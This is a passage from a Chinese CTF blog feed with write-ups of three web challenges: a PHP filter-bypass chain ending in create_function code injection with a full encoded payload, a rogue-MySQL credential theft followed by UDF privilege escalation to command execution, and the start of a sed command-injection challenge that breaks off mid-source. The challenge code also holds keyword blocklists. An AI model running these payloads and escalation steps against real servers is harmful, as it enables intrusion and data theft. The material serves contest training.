flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>okok解释一下吧</p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>QUERY_STRING就是问号后面的数据<br><img src="https://img-blog.csdnimg.cn/direct/b07e8e63d63146e987217970071e1079.png" alt="456"><br>也就是说问号后面的数据不能出现正则匹配里的字符<br>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不可以进行urldecode，而<code>$_GET[]</code>可以，因此可以用url全编码绕过正则</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>/^aqua_is_cute$/</code>开头结尾都是<strong>aqua_is_cute</strong><br>就是说传入debu的字符不能等于<strong>aqua_is_cute</strong>而且还要满足正则表达式，（使用换行%0a来绕过正则匹配）<br>debu&#x3D;aqua_is_cute%0a</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>涉及到一个小tirck：<br>$_REQUEST在同时接受POST和GET参数时，POST优先级高</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也就是file传入的参数等于<strong>debu_debu_aqua</strong>，这里要绕过file_get_contents函数使用data伪协议<code>file=data://text/plain,debu_debu_aqua</code></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注意到这里，后面会用到</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个就是使用数组绕过就行<br>shana[]&#x3D;1&amp;passwd[]&#x3D;2</p><p>到这里就还剩最后一关，整理一下上面的<br><code>debu=aqua_is_cute%0a</code><br><code>file=data://text/plain,debu_debu_aqua</code><br><code>shana[]=1&amp;passwd[]=2</code><br>针对于<code>$_REQUEST在同时接受POST和GET参数时，POST优先级高</code>，只需再传入一个POST的<code>debu</code>和<code>file</code>值为数字即可。<br><code>1nD3x.php?debu=aqua_is_cute%0a&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code><br>在进行url全编码可得<br><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code><br>POST<code>file=1&amp;debu=2</code><br><img src="https://img-blog.csdnimg.cn/direct/f0da076569004a95af4254cd1d034c89.png" alt="123"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可控的有code和arg，在<code>$code(&#39;&#39;, $arg)</code>可以使用creat_function进行注入<br>上面出现的<code>extract($_GET[&quot;flag&quot;]);</code>在这里发挥了作用</p><blockquote><p>extract()函数用于从数组中将变量导入到当前的符号表。换句话说，它会创建新的变量，这些变量的名称和值来自于你传递给 extract() 的数组。<br>因此，extract($_GET[“flag”]); 这行代码的意图是从 URL 参数中获取名为 “flag” 的值，并尝试使用这个值作为变量名来创建一个新的变量，同时这个新变量的值也将是 “flag” 参数的值。<br>例如，如果 URL 是 <a href="http://example.com/?flag=testValue%EF%BC%8C%E9%82%A3%E4%B9%88%E6%89%A7%E8%A1%8C%E8%BF%99%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%90%8E%EF%BC%8C%E5%B0%86%E4%BC%9A%E6%9C%89%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BA">http://example.com/?flag=testValue，那么执行这行代码后，将会有一个名为</a> $testValue 的新变量，其值为 “testValue”。</p></blockquote><p>这就好理解了，现在传入flag[code]，flag[arg]。也就是存在了GET传入的code和arg参数。<br>在基于要配合<code>create_function</code>进行注入：<br><code>flag[code]=create_function</code><br>这时就是<br><code>create_function(&#39;&#39;, $arg);</code><br>尝试传入arg的值让代码进行闭合<br><code>flag[arg]=&#125;代码；//</code><br>这里}就闭合了create_function函数也注释了后面的内容<br>然后构造<code>flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code><br>var_dump(get_defined_vars())：打印出当前作用域内所有已定义变量的名称、类型和值。<br>再进行全编码后可得<br><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//</code><br><img src="https://img-blog.csdnimg.cn/direct/f67e05b827b8418b9bb0bb2d20765aed.png" alt="123"><br>使用require读取flag文件<br><code>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</code><br>替换<code>var_dump(get_defined_vars())</code>由于要进行无参传入，这里使用<del>绕过正则<br>&#96;require(</del>(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))<code>最后的payload</code>1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&#96;<br><img src="https://img-blog.csdnimg.cn/direct/3a91063c328541b88119eae0f8a3d8ee.png" alt="465"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>第七届西湖论剑-web-only_sql</title>
    <link href="http://3143047748.github.io/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web-only-sql/"/>
    <id>http://3143047748.github.io/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web-only-sql/</id>
    <published>2024-01-31T07:45:28.000Z</published>
    <updated>2024-01-31T07:47:12.154Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h2><p>这个题在NN的company下做了出来😊<br>打开题目是一个连接数据库的界面<br><img src="https://img-blog.csdnimg.cn/direct/7c175920fdaf4a6fa917d92017b06c12.png" alt="123"><br>那么可以先伪造一个数据库，采用的项目是<a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-Mysql-Server</a>，具体看可以参考文章<a href="https://blog.csdn.net/tomyyyyyy/article/details/119881486">伪造mysql服务端</a><br>将项目中的rogue_mysql_server.py文件修改一下<br><img src="https://img-blog.csdnimg.cn/direct/beba83f897c2484ba782cab1a8cb6820.png" alt="123"><br>放在vps上运行<br><img src="https://img-blog.csdnimg.cn/direct/2a3409ccf8a04985a1c1a4f906625036.png" alt="123"><br>然后执行任意语句后查看生成的日志mysql.log<br><img src="https://img-blog.csdnimg.cn/direct/7af086addf264d6fa64a107d9207ced1.png" alt="123"></p><blockquote><p>127.0.0.1:3306<br>root<br>1q2w3e4r5t!@#<br>mysql</p></blockquote><p>连接靶机数据库，后面看看能不能进行数据库提权（UDF提权），查看项目<a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md">linux环境下的MySQL UDF提权</a><br>按照上面的说明进行udf提权<br><img src="https://img-blog.csdnimg.cn/direct/26d82c9cba154c458e5a6d74ce68c435.png" alt="123"></p><p><img src="https://img-blog.csdnimg.cn/direct/d1c067ac9e77401898c0936997323213.png" alt="123"><br>可以进行提权</p><h3 id="1、获取plugin路径"><a href="#1、获取plugin路径" class="headerlink" title="1、获取plugin路径"></a>1、获取plugin路径</h3><blockquote><p>show variables like “%plugin%”;<br><img src="https://img-blog.csdnimg.cn/direct/e4b8affacfbb4f4facf90e0cf1803859.png" alt="456"></p></blockquote><h3 id="2、获取服务器版本信息"><a href="#2、获取服务器版本信息" class="headerlink" title="2、获取服务器版本信息"></a>2、获取服务器版本信息</h3><blockquote><p>show variables like ‘version_compile_%’;<br><img src="https://img-blog.csdnimg.cn/direct/e1b913e4990e401f85094a60b0b13244.png" alt="123"></p></blockquote><h3 id="3、从sqlmap获取现成的udf文件"><a href="#3、从sqlmap获取现成的udf文件" class="headerlink" title="3、从sqlmap获取现成的udf文件"></a>3、从sqlmap获取现成的udf文件</h3><p>分别是32位和64位的，我们选择64位的。（metasploit里面也有udf文件）</p><h3 id="4、上传udf库文件"><a href="#4、上传udf库文件" class="headerlink" title="4、上传udf库文件"></a>4、上传udf库文件</h3><p>获取库文件的16进制（这里我的linux中没有安装mysql服务，因此我把so文件放在了windows里面来得到的文件的16进制）<br>开启MySQL服务然后获取so文件的16进制</p><blockquote><p>select hex(load_file(‘C:\Users\86159\Desktop\lib_mysqludf_sys.so’)) into outfile ‘C:\Users\86159\Desktop\udf.txt’;<br>注意路径要进行双斜杠</p><p><img src="https://img-blog.csdnimg.cn/direct/d2812023f9944fc2ac38c4d005f72690.png" alt="123"><br>成功得到udf.txt<br>4.1、上传库文件<br>select unhex(‘7F454C46020101……000’) into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;p1ugin&#x2F;mysqludf.so’;<br><code>7F454C46020101......000</code>是udf.txt文件内容，注意不要换行！！<br>上面这个命令在靶机的mysql交互命令行里执行</p></blockquote><p>然后依次执行</p><blockquote><p>create function sys_eval returns string soname “mysqludf.so”;<br>select sys_eval(‘whoami’);（到这里就可以命令执行了）</p></blockquote><p><img src="https://img-blog.csdnimg.cn/direct/86d5cfda97a24523bcefd3aff7e92e94.png" alt="123"><br>flag在环境变量里面执行env</p><p><img src="https://img-blog.csdnimg.cn/direct/e006ffe2bcae4eabb24a8c75ed0097ef.png" alt="123"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="赛事WP" scheme="http://3143047748.github.io/categories/%E8%B5%9B%E4%BA%8BWP/"/>
    
    
    <category term="ctf" scheme="http://3143047748.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>NCTF-2023-Webshell-Generator</title>
    <link href="http://3143047748.github.io/2024/01/31/NCTF-2023-Webshell-Generator/"/>
    <id>http://3143047748.github.io/2024/01/31/NCTF-2023-Webshell-Generator/</id>
    <published>2024-01-31T05:14:11.000Z</published>
    <updated>2024-01-31T05:15:14.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/><h2 id="NCTF-2023-Webshell-Generator"><a href="#NCTF-2023-Webshell-Generator" class="headerlink" title="[NCTF 2023]Webshell Generator"></a>[NCTF 2023]Webshell Generator</h2><p>以前的题目了，今天过来复现一下吧。。。<br>这个主要考察sed命令注入，当然这个题目它存在文件读取，难度相对来说也好了一点<br>打开题目页面如下：<br><img src="https://img-blog.csdnimg.cn/direct/135f4f194de849418962770eb0a2ec18.png" alt="123"></p><p>经过测试发现密钥我们是可控的，还有一点在使用bp的过程中，下载webshell.php的响应包出现可疑点。</p><p><img src="https://img-blog.csdnimg.cn/direct/5cc52620e5fd4099afa1cca8953bfb9b.png" alt="123"></p><p>尝试一下能不能读取文件，很确定，当然可以😁<br><img src="https://img-blog.csdnimg.cn/direct/dcd24a6978f44b74ae6a845138129fd7.png" alt="456"><br>将文件index,php、download.php、generate.sh读取出来审计<br>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">security_validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\r|\n/'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span> 不能包含换行符！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">114</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span> 不能超过114个字符！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">security_validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'language'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'PHP'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP是最好的语言"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"METHOD=<span class="token interpolation"><span class="token variable">$method</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你的method太复杂了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KEY=<span class="token interpolation"><span class="token variable">$key</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你的key太复杂了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$status_code</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh generate.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"生成失败了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: download.php?file=<span class="token interpolation"><span class="token variable">$filename</span></span>&amp;filename=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Webshell生成器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>            <span class="token property">background-color</span><span class="token punctuation">:</span> #f2f2f2<span class="token punctuation">;</span>            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">form</span> <span class="token punctuation">&#123;</span>            <span class="token property">margin</span><span class="token punctuation">:</span> 50px auto<span class="token punctuation">;</span>            <span class="token property">width</span><span class="token 